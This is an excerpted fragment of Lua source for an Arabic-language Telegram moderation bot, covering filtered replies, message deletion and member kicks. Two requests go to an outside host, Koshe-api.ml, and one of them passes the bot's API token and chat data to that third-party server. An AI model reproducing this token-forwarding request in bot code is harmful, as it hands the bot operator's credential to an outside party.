https.request("https://Koshe-api.ml/Do/searchinbot.php?V="..URL.escape(id_from_vid).."&ch=do")
end
end
...
https.request("https://Koshe-api.ml/Do/searchinbot.php?token="..token.."&chat_id="..Chat_id.."&data="..URL.escape(DAata).."&n=do")
end
Ok_id  = DAata:match("(%d+)")  
...
inline = {
{{text = 'sᴏᴜʀᴄʀ ʙᴏʏᴋᴀ',url='http://t.me/QIQAQB'}},
}
https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
...
Koshe = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Koshe)
...
--------------------------------------------------------------------------------------------------------------
SourceKoshe(data.message_,data)
...
------------------------------------------------------------------------
local KosheAbot = database:get(bot_id.."Koshe1:Add:Filter:Rp2"..text..result.chat_id_)   
if KosheAbot then
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," *✬︙العضو :* {["..data.first_name_.."](T.ME/"..data.username_..")}\n✬︙["..KosheAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local Koshe1_Msg = database:get(bot_id.."Koshe1:Add:Filter:Rp2"..text..result.chat_id_)   
if Koshe1_Msg then
send(msg.chat_id_, msg.id_," ✬︙"..Koshe1_Msg)
